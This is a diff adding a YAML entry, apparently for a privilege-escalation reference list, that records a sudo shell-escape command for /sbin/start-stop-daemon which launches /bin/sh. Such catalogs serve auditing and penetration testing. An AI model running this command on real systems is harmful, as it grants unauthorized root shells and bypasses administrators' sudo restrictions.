@@ -1,0 +1,4 @@
+name: start-stop-daemon
+binary_path: /sbin/start-stop-daemon
+exploit_cmds:
+- sudo /sbin/start-stop-daemon -S -x /bin/sh
